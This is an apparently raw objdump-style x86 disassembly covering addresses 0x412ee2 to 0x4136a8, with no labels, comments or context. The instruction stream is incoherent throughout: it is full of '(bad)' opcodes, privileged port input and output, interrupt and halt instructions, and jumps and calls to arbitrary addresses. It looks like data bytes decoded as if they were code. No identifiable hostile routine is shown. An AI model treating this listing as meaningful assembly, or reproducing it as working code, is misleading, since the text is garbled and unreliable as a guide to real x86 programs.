  412ee2:	adc    eax,0x15a03a0a
  412ee7:	stc    
  412ee8:	xor    DWORD PTR [edi],edx
  412eea:	inc    edi
  412eeb:	arpl   WORD PTR [ebx],ax
  412eed:	outs   dx,BYTE PTR ds:[esi]
  412eee:	imul   edx,ebx,0x17
  412ef1:	frstor [esp+ebx*2+0x187af366]
  412ef8:	mov    esp,0xfce5f66f
  412efd:	fiadd  WORD PTR [esi]
  412eff:	xlat   BYTE PTR cs:[ebx]
  412f01:	outs   dx,DWORD PTR ds:[esi]
  412f02:	fld    st(0)
  412f04:	add    al,0xe3
  412f06:	sub    BYTE PTR [edx-0x70d036b4],cl
  412f0c:	and    ebp,eax
  412f0e:	in     al,dx
  412f0f:	xchg   esi,eax
  412f10:	push   edi
  412f11:	inc    ecx
  412f12:	mov    al,ds:0x38df6467
  412f17:	ficomp DWORD PTR ds:0xaed3b84b
  412f1d:	lds    eax,FWORD PTR [ecx+0x5b]
  412f20:	cmp    BYTE PTR [edi],ch
  412f22:	mov    bl,0xed
  412f24:	cli    
  412f25:	jns    0x412f66
  412f27:	sbb    BYTE PTR [ebx-0x21],bl
  412f2a:	push   ds
  412f2b:	or     ecx,DWORD PTR [eax]
  412f2d:	pusha  
  412f2e:	jno    0x412f91
  412f30:	xchg   esp,eax
  412f31:	stos   BYTE PTR es:[edi],al
  412f32:	mov    edx,0xb857f13c
  412f37:	mov    ecx,0x4a5d598f
  412f3c:	cmp    bh,BYTE PTR [ecx+eax*8+0x5e]
  412f40:	sub    al,BYTE PTR [edi+0x15]
  412f43:	mov    ecx,DWORD PTR [eax-0x55]
  412f46:	push   esp
  412f47:	adc    BYTE PTR ds:0x121c66d3,ch
  412f4d:	push   esp
  412f4e:	xchg   edx,eax
  412f4f:	out    0xfb,eax
  412f51:	xchg   ebx,eax
  412f52:	mov    ebp,fs
  412f54:	test   dl,dh
  412f56:	adc    ebp,DWORD PTR [eax-0x1e]
  412f59:	adc    al,0xa9
  412f5b:	pop    ecx
  412f5c:	or     eax,0x7e01ac02
  412f61:	dec    esi
  412f62:	sbb    BYTE PTR [esp],0x45
  412f66:	hlt    
  412f67:	xchg   esi,eax
  412f68:	cmp    DWORD PTR [ebp+0x1f],0xbc3a6ac0
  412f6f:	inc    eax
  412f70:	sub    esp,ecx
  412f72:	xchg   ebp,eax
  412f73:	mov    al,ds:0x105e624f
  412f78:	xchg   ebx,eax
  412f79:	xor    eax,0xd11b031b
  412f7e:	retf   
  412f7f:	les    ebp,FWORD PTR [esi]
  412f81:	cmp    BYTE PTR [ecx],ah
  412f83:	and    bl,ah
  412f85:	add    cl,BYTE PTR [edx+edi*2+0x6e]
  412f89:	ja     0x412f82
  412f8b:	xchg   BYTE PTR [edi],cl
  412f8d:	xchg   esi,eax
  412f8e:	loope  0x412f82
  412f90:	cdq    
  412f91:	push   es
  412f92:	test   ah,0xa
  412f95:	call   0x93c77145
  412f9a:	jno    0x412fa2
  412f9c:	repnz inc ebp
  412f9e:	enter  0xd5fd,0x16
  412fa2:	in     al,0xc3
  412fa4:	xchg   ecx,eax
  412fa5:	sbb    DWORD PTR [esi-0x67],ebp
  412fa8:	cs ins DWORD PTR es:[edi],dx
  412faa:	pop    esp
  412fab:	pusha  
  412fac:	nop
  412fad:	push   cs
  412fae:	or     ecx,0xd1236654
  412fb4:	dec    edi
  412fb5:	ret    
  412fb6:	retf   
  412fb7:	fst    DWORD PTR [ecx-0x42726fb1]
  412fbd:	push   esp
  412fbe:	mov    DWORD PTR [eax-0x74908a4],ebp
  412fc4:	mov    eax,ds:0x7f63a2b6
  412fc9:	inc    esi
  412fca:	int    0x2d
  412fcc:	inc    esp
  412fcd:	inc    DWORD PTR [edi]
  412fcf:	push   ebx
  412fd0:	mov    bh,0x67
  412fd2:	pop    ss
  412fd3:	pop    edi
  412fd4:	dec    ebp
  412fd5:	xor    BYTE PTR [eax],bh
  412fd7:	mov    DWORD PTR [edi+0x3e],ebp
  412fda:	test   DWORD PTR [ecx],ecx
  412fdc:	retf   0xbd17
  412fdf:	fbstp  TBYTE PTR [eax+edx*4]
  412fe2:	jg     0x412fb4
  412fe4:	add    eax,0x459060a8
  412fe9:	fcomp  QWORD PTR [ecx+0x7d]
  412fec:	ret    
  412fed:	push   esi
  412fee:	xchg   ebp,eax
  412ff0:	ds push ecx
  412ff2:	cmp    dl,BYTE PTR [esi-0x5f]
  412ff5:	pop    edx
  412ff6:	lea    ebx,[edi+edi*4-0x3f]
  412ffa:	jne    0x412fe6
  412ffc:	push   ebx
  412ffd:	inc    esi
  412ffe:	inc    esp
  412fff:	jmp    0x413008
  413001:	in     al,dx
  413002:	retf   0xf7b4
  413005:	fdiv   QWORD PTR [edx+0x387d5756]
  41300b:	dec    ebp
  41300c:	popf   
  41300d:	cs pop ebx
  41300f:	inc    ebp
  413010:	ss fs pop edi
  413013:	push   ebx
  413014:	or     dl,ah
  413016:	inc    esp
  413017:	fxch   st(6)
  413019:	je     0x412fe2
  41301b:	pushf  
  41301c:	jl     0x41307c
  41301e:	sbb    bh,BYTE PTR [ebp-0x27aaafbb]
  413024:	and    BYTE PTR [edx+0x60],0x32
  413028:	(bad)  
  413029:	sbb    eax,DWORD PTR [ebp+ebx*8+0x62]
  41302d:	out    0x34,eax
  41302f:	stos   BYTE PTR es:[edi],al
  413030:	sub    BYTE PTR [ecx-0x53],dl
  413033:	fldcw  WORD PTR [ebp+0x66]
  413036:	lods   eax,DWORD PTR ds:[esi]
  413037:	mov    ds:0xd2e6e459,eax
  41303c:	inc    eax
  41303d:	or     bl,dh
  41303f:	adc    al,0x1d
  413041:	dec    esp
  413042:	or     bh,BYTE PTR [eax]
  413044:	jge    0x413031
  413046:	aaa    
  413047:	sub    dl,BYTE PTR [edx+0x67]
  41304a:	add    ecx,DWORD PTR [ebp-0xe]
  41304d:	xchg   esi,eax
  41304e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41304f:	mov    esp,0xb0d2a829
  413054:	cld    
  413055:	adc    eax,0x9bbb64a2
  41305a:	sbb    eax,0xb8f16b68
  41305f:	push   edi
  413060:	popf   
  413061:	sbb    dl,dl
  413063:	es mov bh,0xf0
  413066:	cmp    eax,0xfe822a2
  41306b:	pop    esi
  41306c:	xlat   BYTE PTR ds:[ebx]
  41306d:	loope  0x413066
  41306f:	cld    
  413070:	push   esi
  413071:	fisubr WORD PTR [eax+0x73]
  413074:	mov    ebx,0x7e0b8a8
  413079:	xlat   BYTE PTR ds:[ebx]
  41307a:	sbb    ch,ah
  41307c:	loopne 0x413053
  41307e:	and    dh,BYTE PTR ds:0xcc642a79
  413084:	dec    esp
  413085:	cdq    
  413086:	sar    DWORD PTR [ebx+eiz*8],cl
  413089:	cmp    BYTE PTR [edi-0x9188ac0],bh
  41308f:	sub    DWORD PTR [ebx+0x1f],ebp
  413092:	retf   0x4262
  413095:	mov    ebp,DWORD PTR ds:0x4963d198
  41309b:	std    
  41309c:	lahf   
  41309d:	and    ch,cl
  41309f:	hlt    
  4130a0:	stos   DWORD PTR es:[edi],eax
  4130a1:	cmp    DWORD PTR [edi+0x74],0xe2d0589a
  4130a8:	mov    dl,0x35
  4130aa:	(bad)  
  4130ab:	xor    eax,0x2ae3e196
  4130b0:	sti    
  4130b1:	cs mov bl,0x17
  4130b4:	xor    dh,dl
  4130b6:	fsubrp st(4),st
  4130b8:	in     al,0xf5
  4130ba:	repnz adc al,0x8
  4130bd:	sbb    ch,bl
  4130bf:	fsubr  DWORD PTR [ecx+0x3]
  4130c2:	mov    esi,DWORD PTR [edi]
  4130c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130c5:	rcr    BYTE PTR [ebp-0x2c],1
  4130c8:	ss inc esi
  4130ca:	mov    al,0x84
  4130cc:	jg     0x413070
  4130ce:	ins    BYTE PTR es:[edi],dx
  4130cf:	ds mov ebp,0xd6b0935d
  4130d5:	pop    ebx
  4130d6:	mov    ah,BYTE PTR fs:[esi+edx*1-0x74]
  4130db:	lods   eax,DWORD PTR ds:[esi]
  4130dc:	neg    edi
  4130de:	add    al,0x73
  4130e0:	dec    eax
  4130e1:	ret    
  4130e2:	std    
  4130e3:	xor    al,BYTE PTR [eax]
  4130e5:	dec    ebp
  4130e6:	dec    esi
  4130e7:	test   edx,ecx
  4130e9:	cmp    edx,esi
  4130eb:	add    cl,bl
  4130ed:	fstp   DWORD PTR [esi]
  4130ef:	(bad)  
  4130f0:	cmp    eax,0xa5173ee4
  4130f5:	mov    ecx,0xc890a901
  4130fa:	mov    al,cl
  4130fc:	paddb  mm1,QWORD PTR [edi-0x69bdb0fc]
  413103:	cmc    
  413104:	adc    BYTE PTR [esi-0x1e],al
  413107:	dec    ecx
  413108:	inc    ebx
  413109:	or     al,0x94
  41310b:	call   0x1d98ba9
  413110:	mov    esi,0x3d4704d4
  413115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413116:	popf   
  413117:	mov    ds:0x9f6ab6a4,eax
  41311c:	xchg   esi,eax
  41311d:	cli    
  41311e:	mov    BYTE PTR [esi-0x61],ch
  413121:	out    dx,al
  413122:	xor    al,0xb3
  413124:	mov    edi,0xed63f055
  413129:	sar    BYTE PTR [ecx+0x5d],cl
  41312c:	cmp    ecx,0xa
  41312f:	out    dx,al
  413130:	cmp    ebp,DWORD PTR [edi]
  413132:	push   ecx
  413133:	daa    
  413134:	jae    0x4131a8
  413136:	sub    edx,edi
  413138:	add    eax,0x2c89bc7f
  41313d:	push   ds
  41313e:	push   ss
  41313f:	dec    ebx
  413140:	sub    BYTE PTR [edx+0x6e],cl
  413143:	mov    ah,0x3b
  413145:	push   ebx
  413146:	and    dl,BYTE PTR [ebx+0x5931dd78]
  41314c:	xchg   esp,eax
  41314d:	mov    ebp,DWORD PTR [edx+0x41d7cf19]
  413153:	push   ecx
  413154:	pusha  
  413155:	das    
  413156:	mov    cl,0x3a
  413158:	scas   eax,DWORD PTR es:[edi]
  413159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41315a:	leave  
  41315b:	mov    ebp,0xfe5e632e
  413160:	jb     0x41319b
  413162:	retf   0xd392
  413165:	pusha  
  413166:	jmp    0x4131d0
  413168:	jo     0x413110
  41316a:	inc    edx
  41316b:	jmp    0xd81e:0x7080e5a1
  413172:	or     bl,BYTE PTR [ecx]
  413174:	pop    ebp
  413175:	sub    eax,0xf89453c4
  41317a:	xor    al,0xe1
  41317c:	bound  bp,DWORD PTR [edx-0x171b6ccd]
  413183:	cmc    
  413184:	leave  
  413185:	stos   BYTE PTR es:[edi],al
  413186:	jae    0x413179
  413188:	xchg   ebp,esp
  41318a:	pusha  
  41318b:	mov    eax,0xcebdc41f
  413190:	cmc    
  413191:	into   
  413192:	sbb    al,0x9e
  413194:	in     al,0xba
  413196:	loope  0x41318f
  413198:	cs pop esp
  41319a:	iret   
  41319b:	cmp    ch,al
  41319d:	cs aaa 
  41319f:	sti    
  4131a0:	enter  0x1412,0x22
  4131a4:	push   es
  4131a5:	aas    
  4131a6:	pushf  
  4131a7:	mov    esp,DWORD PTR [esi-0x27]
  4131aa:	and    dh,ah
  4131ac:	imul   esp,esi,0xffffffeb
  4131af:	scas   al,BYTE PTR es:[edi]
  4131b0:	cmp    ah,BYTE PTR [edx+0x3f3b0c28]
  4131b6:	dec    edi
  4131b7:	mov    esp,0x93a1cf4f
  4131bc:	mul    DWORD PTR [ecx+eax*2-0x5f]
  4131c0:	sbb    eax,0x783c0dda
  4131c5:	jle    0x413223
  4131c7:	daa    
  4131c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131c9:	dec    ebp
  4131ca:	and    edi,DWORD PTR [esi+0x75616311]
  4131d0:	mov    edi,0xaaaee711
  4131d5:	int3   
  4131d6:	xchg   ebp,eax
  4131d7:	sti    
  4131d8:	mov    ds:0x17a683b1,al
  4131dd:	mov    al,ds:0xb6e84957
  4131e2:	iret   
  4131e3:	and    BYTE PTR [ebx],bh
  4131e5:	jmp    0x4867b062
  4131ea:	retf   0xbde8
  4131ed:	mov    bh,bh
  4131ef:	xchg   ebx,eax
  4131f0:	cmp    ebp,edx
  4131f2:	repz adc eax,0x1400d699
  4131f8:	std    
  4131f9:	ins    DWORD PTR es:[edi],dx
  4131fa:	xchg   DWORD PTR [ecx-0x60],ebx
  4131fd:	mov    WORD PTR [edi+eax*8-0x3d],?
  413201:	sub    bh,bh
  413203:	cmp    al,0x6e
  413205:	out    0xed,al
  413207:	xor    DWORD PTR ds:0x26a213cf,edi
  41320d:	xchg   edi,eax
  41320e:	or     DWORD PTR [edx-0x3fa501f2],esi
  413214:	pop    ss
  413215:	pop    ebx
  413216:	pop    edx
  413217:	pop    eax
  413218:	das    
  413219:	sbb    eax,eax
  41321b:	pop    ss
  41321c:	rcl    BYTE PTR [esp+ebx*4],cl
  41321f:	data16 aas 
  413221:	mov    ah,0x8e
  413223:	add    al,0xf8
  413225:	pop    ebx
  413226:	fs jmp 0x1428c00d
  41322c:	sub    eax,ebp
  41322e:	and    cl,BYTE PTR [ebp-0x6d]
  413231:	inc    ecx
  413232:	pop    es
  413233:	push   ss
  413234:	pop    esi
  413235:	add    al,0x27
  413237:	es stc 
  413239:	es push ds
  41323b:	cld    
  41323c:	cwde   
  41323d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41323e:	std    
  41323f:	sub    al,0x33
  413241:	jle    0x4131f2
  413243:	loop   0x4132c4
  413245:	adc    dh,BYTE PTR [edx]
  413247:	add    bl,ah
  413249:	jge    0x41321c
  41324b:	les    ebx,FWORD PTR [esi+0x61eb1bb2]
  413251:	loopne 0x41320b
  413253:	xor    esi,esi
  413255:	enter  0x1e6d,0xd0
  413259:	adc    ah,BYTE PTR [eax+0x7697f323]
  41325f:	dec    eax
  413260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413261:	xchg   edx,eax
  413262:	dec    esi
  413263:	push   ebp
  413264:	rol    DWORD PTR [edi+edi*4],1
  413267:	aam    0xcf
  413269:	rcr    BYTE PTR [edx+0x5754d9cd],0x4e
  413270:	fs adc ch,bl
  413273:	mov    ds:0xaa798887,al
  413278:	ins    BYTE PTR es:[edi],dx
  413279:	mov    ?,WORD PTR [ebp-0x4b95db6]
  41327f:	adc    ch,BYTE PTR [ecx]
  413281:	or     al,0x47
  413283:	stos   BYTE PTR es:[edi],al
  413284:	(bad)
  413288:	sbb    eax,0x25ba5852
  41328d:	out    0x4c,al
  41328f:	or     dh,BYTE PTR [ecx]
  413291:	dec    edx
  413292:	mov    ah,0x9b
  413294:	or     bh,bl
  413296:	out    dx,al
  413297:	fsubr  QWORD PTR [eax+0x4d]
  41329a:	leave  
  41329b:	ds or  al,0x55
  41329e:	mov    DWORD PTR [ebx+ebp*4],ecx
  4132a1:	jne    0x413305
  4132a3:	in     al,0xac
  4132a5:	retf   0xb236
  4132a8:	aad    0xf4
  4132aa:	outs   dx,DWORD PTR ds:[esi]
  4132ab:	or     esi,edi
  4132ad:	cmp    DWORD PTR [ecx-0x6d458552],edi
  4132b3:	jecxz  0x41325f
  4132b5:	sbb    ebx,DWORD PTR [ecx-0x2bbc022c]
  4132bb:	sub    BYTE PTR [ebp+0x47],dh
  4132be:	push   ds
  4132bf:	inc    esp
  4132c0:	out    0x21,eax
  4132c2:	jnp    0x41327a
  4132c4:	ret    0x8351
  4132c7:	out    dx,al
  4132c8:	xchg   DWORD PTR [esi+0x29561323],eax
  4132ce:	icebp  
  4132cf:	outs   dx,DWORD PTR ds:[esi]
  4132d0:	lahf   
  4132d1:	(bad)  [eax]
  4132d3:	(bad)  
  4132d4:	data16 lods al,BYTE PTR ds:[esi]
  4132d6:	jno    0x413289
  4132d8:	jle    0x4132df
  4132da:	shl    BYTE PTR [ebx-0x31],0x4f
  4132de:	in     al,0x8a
  4132e0:	add    DWORD PTR [edi+0x4],edi
  4132e3:	pop    esi
  4132e4:	out    dx,eax
  4132e5:	in     eax,0x62
  4132e7:	xor    DWORD PTR [ebp-0xc],0x6f
  4132eb:	cmp    eax,0x666b1bb0
  4132f0:	xor    BYTE PTR [edx+0x3c1c9e28],0x27
  4132f7:	push   ebx
  4132f8:	pop    ebx
  4132f9:	mov    eax,esp
  4132fb:	mov    eax,eax
  4132fd:	mov    ebp,0x8ba19c2a
  413302:	rol    DWORD PTR [ecx+0x19fe8747],cl
  413308:	and    esi,edx
  41330a:	inc    esp
  41330b:	sbb    DWORD PTR [ecx+0x14],eax
  41330e:	std    
  41330f:	mov    bl,0xa6
  413311:	int    0x50
  413313:	nop
  413314:	lods   eax,DWORD PTR ds:[esi]
  413315:	arpl   WORD PTR [eax+0x2e],bp
  413318:	push   ecx
  413319:	loop   0x413355
  41331b:	out    0xe9,eax
  41331d:	dec    eax
  41331e:	cmp    eax,0xe5933a86
  413323:	and    cl,dl
  413325:	mov    edi,0xd2f4f976
  41332a:	jo     0x413382
  41332c:	xor    BYTE PTR [edi+0x3],dl
  41332f:	leave  
  413330:	cdq    
  413331:	jbe    0x413325
  413333:	popf   
  413334:	int    0xf3
  413336:	dec    edx
  413337:	int3   
  413338:	push   esi
  413339:	jne    0x413319
  41333b:	mov    cs,WORD PTR ds:0x9f58acc5
  413341:	or     al,bh
  413343:	jb     0x413301
  413345:	xchg   ebp,eax
  413346:	xchg   DWORD PTR [edx+0x23],ecx
  413349:	cs mov bl,0xef
  41334c:	xchg   edx,eax
  41334d:	sbb    eax,0x8d4a6283
  413352:	jbe    0x413308
  413354:	mov    dh,bh
  413356:	loope  0x41337c
  413358:	fisttp WORD PTR [ebp+0x6e0d3aed]
  41335e:	push   0x4a04344c
  413363:	xor    ah,BYTE PTR [ebp-0x25e360f0]
  413369:	clc    
  41336a:	or     dl,BYTE PTR [esi]
  41336c:	add    BYTE PTR [ebx+0x418921d5],dh
  413372:	daa    
  413373:	xor    BYTE PTR [ecx-0x51],cl
  413376:	outs   dx,DWORD PTR ds:[esi]
  413377:	in     al,0x85
  413379:	call   0x28e6d767
  41337e:	push   0x70efbc43
  413383:	pusha  
  413384:	fisubr DWORD PTR ds:0xf6c87d4a
  41338a:	pop    es
  41338b:	xor    DWORD PTR [esi-0x7c2820b5],edi
  413391:	mov    al,ds:0x1acdc259
  413396:	dec    eax
  413397:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413398:	push   esp
  413399:	into   
  41339a:	mov    esp,0x827eb068
  41339f:	sub    edi,edi
  4133a1:	dec    edx
  4133a2:	xor    esp,DWORD PTR [esi-0x21]
  4133a5:	jl     0x413395
  4133a7:	mov    edi,DWORD PTR [ebx+eiz*4+0x60]
  4133ab:	cmp    al,0xc0
  4133ad:	or     bh,BYTE PTR [esi]
  4133af:	dec    ebp
  4133b0:	xor    DWORD PTR [edx+ecx*4],esi
  4133b3:	ret    0x6bf0
  4133b6:	sbb    DWORD PTR [eax],esp
  4133b8:	mov    ds:0xb66fef50,eax
  4133bd:	daa    
  4133be:	stos   BYTE PTR es:[edi],al
  4133bf:	fidivr WORD PTR [ebp+0x67]
  4133c2:	neg    BYTE PTR [edx-0x493ace23]
  4133c8:	xchg   esi,eax
  4133c9:	or     bh,al
  4133cb:	mov    ecx,0xc83f348e
  4133d0:	sbb    DWORD PTR [ebx],edi
  4133d2:	and    BYTE PTR ds:0x6afe66f0,0x79
  4133d9:	popa   
  4133da:	xchg   edi,eax
  4133db:	(bad)  
  4133dc:	mov    ds:0x96925d81,eax
  4133e1:	pop    ss
  4133e2:	push   edx
  4133e3:	sbb    ch,0x1e
  4133e6:	cs clc 
  4133e8:	clc    
  4133e9:	mov    eax,0x22225c4a
  4133ee:	rol    DWORD PTR ds:0x9e610173,1
  4133f4:	gs sbb cl,cl
  4133f7:	lahf   
  4133f8:	out    dx,eax
  4133f9:	das    
  4133fa:	jmp    0xb6c95914
  4133ff:	jle    0x413475
  413401:	inc    edi
  413402:	lahf   
  413403:	cmp    BYTE PTR [ebp+0x6e096b02],0xc2
  41340a:	jl     0x413418
  41340c:	xchg   DWORD PTR [edi*4+0x302a7078],esi
  413413:	adc    DWORD PTR [eax],0xfffffff0
  413416:	sbb    al,0xa0
  413418:	(bad)  
  413419:	ret    0x6e63
  41341c:	inc    edi
  41341d:	xchg   edi,eax
  41341e:	imul   ebp,DWORD PTR [esi],0x52bef252
  413424:	cmp    bh,BYTE PTR [eax+0x5b]
  413427:	push   edi
  413428:	inc    BYTE PTR ds:0x3fb5cceb
  41342e:	addr16 jmp 0x8fdb0ce6
  413434:	mov    ds:0x1c3f384a,al
  413439:	hlt    
  41343a:	pop    ebx
  41343b:	xor    eax,0x4361a77a
  413440:	fsubr  st,st(3)
  413442:	mov    edx,0x5da3bf79
  413447:	adc    DWORD PTR [ecx+0x5b],0xa75d67b8
  41344e:	les    edi,FWORD PTR [ebp+edx*2+0x6fde7b55]
  413455:	shr    DWORD PTR [ebx-0x3b076e15],0x4b
  41345c:	xchg   ecx,eax
  41345d:	jnp    0x413444
  41345f:	xor    DWORD PTR [eax-0xe],ecx
  413462:	loope  0x413462
  413464:	(bad)  
  413465:	jle    0x4133ec
  413467:	imul   esp,DWORD PTR [ebx],0x855d457d
  41346d:	loop   0x4134a6
  41346f:	imul   esi,DWORD PTR [eax+0x5f],0x34
  413473:	scas   eax,DWORD PTR es:[edi]
  413474:	mov    ds:0x41e53e34,eax
  413479:	imul   ebx,DWORD PTR [ebp-0xf],0x8adc6908
  413480:	and    esp,0xb7e3f155
  413486:	mov    ebx,0xa4cd28e6
  41348b:	mov    edi,0xdca7e4a0
  413490:	dec    edi
  413491:	xor    edi,DWORD PTR [eax+0x2dbbf234]
  413497:	xor    eax,0x8ffad469
  41349c:	pop    edx
  41349d:	pop    ecx
  41349e:	inc    esi
  41349f:	xchg   edx,eax
  4134a0:	sub    BYTE PTR [edi-0x62],0xf7
  4134a4:	jnp    0x41343b
  4134a6:	dec    ecx
  4134a7:	xchg   edi,eax
  4134a8:	cmp    edx,DWORD PTR [eax-0x6802a1c9]
  4134ae:	pop    ebx
  4134af:	sub    bl,cl
  4134b1:	ja     0x4134d2
  4134b3:	out    dx,al
  4134b4:	cs shl cl,1
  4134b7:	pusha  
  4134b8:	ins    DWORD PTR es:[edi],dx
  4134b9:	imul   esp,eax,0xaea56dcb
  4134bf:	adc    al,0xa8
  4134c1:	add    BYTE PTR [eax],al
  4134c3:	mov    es,esp
  4134c5:	add    ch,BYTE PTR [ecx-0x67ccd21f]
  4134cb:	loopne 0x413515
  4134cd:	test   eax,0x3f3d34bf
  4134d2:	inc    eax
  4134d3:	dec    ebp
  4134d4:	xchg   ebx,eax
  4134d5:	lea    esi,[ebp+0x51]
  4134d8:	in     eax,0x9f
  4134da:	pop    ecx
  4134db:	xor    BYTE PTR [ebx-0x70],ch
  4134de:	stc    
  4134df:	dec    ebp
  4134e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134e1:	sbb    DWORD PTR [ecx],esi
  4134e3:	into   
  4134e4:	sbb    eax,DWORD PTR [ebx-0x531335cd]
  4134ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134ec:	sti    
  4134ed:	je     0x413476
  4134ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134f0:	mov    eax,DWORD PTR [edx]
  4134f2:	or     eax,0x9bd502cb
  4134f7:	jge    0x4134dd
  4134f9:	cdq    
  4134fa:	enter  0x872e,0x5f
  4134fe:	mov    edx,0x7a9ea9d8
  413503:	add    eax,0x9d9c2551
  413508:	sar    DWORD PTR [ebx+0x6],1
  41350b:	pop    ss
  41350c:	std    
  41350d:	inc    esp
  41350e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41350f:	std    
  413510:	cmp    eax,0xb03f8a9a
  413515:	fidivr DWORD PTR [esi-0x5349cf30]
  41351b:	shl    dl,cl
  41351d:	cmp    eax,0x52430e0d
  413522:	cmc    
  413523:	jbe    0x4134a6
  413525:	push   eax
  413526:	xchg   edx,eax
  413527:	mov    dh,0x0
  413529:	daa    
  41352a:	and    bl,bl
  41352c:	mov    ebp,0xe20c6ec7
  413531:	and    BYTE PTR [eax],dl
  413533:	add    edx,DWORD PTR [ecx+0x2362a302]
  413539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41353a:	push   cs
  41353b:	pop    ss
  41353c:	jmp    0x41355a
  41353e:	std    
  41353f:	into   
  413540:	cmp    DWORD PTR [ecx],0x5421c58f
  413546:	pusha  
  413547:	test   al,0x73
  413549:	mul    DWORD PTR [ecx+0x37]
  41354c:	pop    edi
  41354d:	pop    es
  41354e:	push   ecx
  41354f:	ror    BYTE PTR [edx+0x2f],1
  413552:	xchg   ebx,edi
  413554:	lods   al,BYTE PTR ds:[esi]
  413555:	mov    edx,0x5ffb920a
  41355a:	ficom  WORD PTR [edx]
  41355c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41355d:	stos   DWORD PTR es:[edi],eax
  41355e:	dec    edx
  41355f:	sub    al,0xe7
  413561:	cdq    
  413562:	push   esp
  413563:	adc    DWORD PTR ds:0xd5982c95,esi
  413569:	inc    ecx
  41356a:	popa   
  41356b:	test   ebx,0xa412bb47
  413571:	ret    0xee5f
  413574:	sbb    dh,BYTE PTR [esi+0x57]
  413577:	cmp    ecx,DWORD PTR [esi]
  413579:	add    DWORD PTR [edi-0x15],esp
  41357c:	(bad)  [ebx-0x46c0f7c1]
  413582:	push   edx
  413583:	mov    BYTE PTR [ecx],bh
  413585:	dec    ebx
  413586:	and    eax,0x38e70616
  41358b:	jns    0x413577
  41358d:	fisttp WORD PTR [ebp+0x63cb28de]
  413593:	ins    BYTE PTR es:[edi],dx
  413594:	sub    ecx,esi
  413596:	adc    eax,0x64f220d
  41359b:	mov    al,ds:0xb5fc7a5d
  4135a0:	sub    eax,0x448ee460
  4135a5:	mov    DWORD PTR [esi-0x13],ecx
  4135a8:	push   ds
  4135a9:	and    eax,0x36254169
  4135ae:	mov    dh,0xd3
  4135b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135b1:	mov    ch,0x6c
  4135b3:	fs dec esp
  4135b5:	pushf  
  4135b6:	cmp    al,0xc8
  4135b8:	mov    ds:0xb8ceb832,eax
  4135bd:	clc    
  4135be:	push   edi
  4135bf:	mov    bh,0x22
  4135c1:	pcmpgtw mm5,QWORD PTR [edi+edi*8+0x6]
  4135c6:	ja     0x41355b
  4135c8:	(bad)  
  4135c9:	push   edx
  4135ca:	xor    al,0x7
  4135cc:	(bad)  
  4135ce:	or     edi,DWORD PTR [ebx+0x2fb0e8d6]
  4135d4:	rcr    BYTE PTR [ecx+0x6d],0xa0
  4135d8:	repz mov eax,ds:0xc7d9d779
  4135de:	data16 loope 0x4135c2
  4135e1:	pop    es
  4135e2:	repz sbb bh,BYTE PTR [eax+0x104b31e6]
  4135e9:	xor    eax,0x992b24d3
  4135ee:	out    0x14,al
  4135f0:	and    esp,edi
  4135f2:	adc    edx,DWORD PTR [ebp-0x66612fbf]
  4135f8:	mov    BYTE PTR [esi+0xa76b470],cl
  4135fe:	pop    ebx
  4135ff:	repnz cmp edx,ecx
  413602:	fimul  WORD PTR [eax]
  413604:	dec    ebx
  413605:	jo     0x413684
  413607:	in     al,dx
  413608:	xchg   ecx,eax
  413609:	dec    edi
  41360a:	pop    edx
  41360b:	loopne 0x41360b
  41360d:	jle    0x413602
  41360f:	fisubr DWORD PTR [ebx]
  413611:	cld    
  413612:	sbb    eax,DWORD PTR [edi-0x53]
  413615:	ret    0xf882
  413618:	loop   0x41361b
  41361a:	nop
  41361b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41361c:	push   cs
  41361d:	test   eax,0xbc0787f4
  413622:	jmp    0xf8cf9c6c
  413627:	mov    eax,ds:0xd73a21e6
  41362c:	xchg   esi,edx
  41362e:	xchg   ecx,eax
  41362f:	xchg   edx,eax
  413630:	out    dx,eax
  413631:	or     eax,0xd9c34329
  413636:	inc    esp
  413637:	ja     0x41368b
  413639:	or     eax,0xc0410cfd
  41363e:	(bad)  
  41363f:	mov    esp,0xe7220bed
  413644:	mov    ds:0x741f15b8,eax
  413649:	dec    esi
  41364a:	inc    eax
  41364b:	aaa    
  41364c:	xor    ch,BYTE PTR [esi-0x5d02cfc5]
  413652:	cs push esi
  413654:	fwait
  413655:	aaa    
  413656:	dec    ecx
  413657:	pop    esi
  413658:	fstp   DWORD PTR ds:0x842131fa
  41365e:	rol    edi,1
  413660:	inc    esi
  413661:	jno    0x413698
  413663:	das    
  413664:	lahf   
  413665:	daa    
  413666:	sbb    bh,BYTE PTR [ebx]
  413668:	xchg   esp,eax
  413669:	mov    al,BYTE PTR ds:0xd7bc9432
  41366f:	je     0x4136ae
  413671:	in     al,dx
  413672:	loopne 0x4136b6
  413674:	test   DWORD PTR [edi],ebx
  413676:	inc    edi
  413677:	xchg   ecx,eax
  413678:	aaa    
  413679:	dec    esp
  41367a:	int    0xb4
  41367c:	mov    al,ds:0x77eeab83
  413681:	sub    al,0xd7
  413683:	pop    ebp
  413684:	fmul   QWORD PTR [ebx-0x2eaea1bc]
  41368a:	jl     0x4136b3
  41368c:	lea    ebx,[edx-0x2d]
  41368f:	ins    BYTE PTR es:[edi],dx
  413690:	(bad)  
  413691:	jecxz  0x413628
  413693:	or     esi,0x958953f2
  413699:	jl     0x4136ae
  41369b:	cmp    eax,edi
  41369d:	repz fst DWORD PTR [esp+esi*8]
  4136a1:	fistp  WORD PTR [ebx-0x1f]
  4136a4:	ja     0x413696
  4136a6:	jp     0x4136cc
  4136a8:	cmp    dh,al
